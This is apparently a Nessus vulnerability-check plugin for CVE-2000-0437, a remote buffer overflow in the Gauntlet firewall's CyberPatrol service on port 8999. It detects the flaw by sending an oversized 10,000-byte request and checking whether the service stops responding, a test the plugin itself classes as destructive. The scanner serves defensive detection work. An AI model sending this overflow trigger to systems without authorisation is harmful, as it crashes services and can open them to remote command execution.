#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10420);
 script_bugtraq_id(1234);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2000-0437");
 script_xref(name:"IAVA", value:" 2000-a-0003");
 script_xref(name:"OSVDB", value:"322");
 
 script_name(english:"Gauntlet CyberPatrol Content Monitoring System Overflow");
 script_summary(english:"Overflow in the Gauntlet product line.");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a buffer overflow." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Network Associated Gauntlet firewall. The
installed version of the software is vulnerable to a buffer overflow.
An attacker could exploit this flaw in order to remotely execute
arbitrary commands on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f69d6a17" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-05/0249.html" );
 script_set_attribute(attribute:"solution", value:
"Apply the workaround or patches from the listed references." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );


script_end_attributes();

 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl");
 script_require_ports(8999);
 exit(0);
}


port = 8999;
if(get_port_state(port))
{
  soc = open_sock_tcp(port);
  if(soc)
  {
    req = string("10003.http://", crap(10), "\r\n");
    send(socket:soc, data:req);
    r = recv(socket:soc, length:2048);
    close(soc);
    if ( ! r ) exit(0);

    soc = open_sock_tcp(port);
    if ( ! soc ) exit(0);
    req = string("10003.http://", crap(10000), "\r\n");
    send(socket:soc, data:req);
    r = recv(socket:soc, length:2048);
    close(soc);
    if(!r)
    {
      security_hole(port);
    }
  }
}
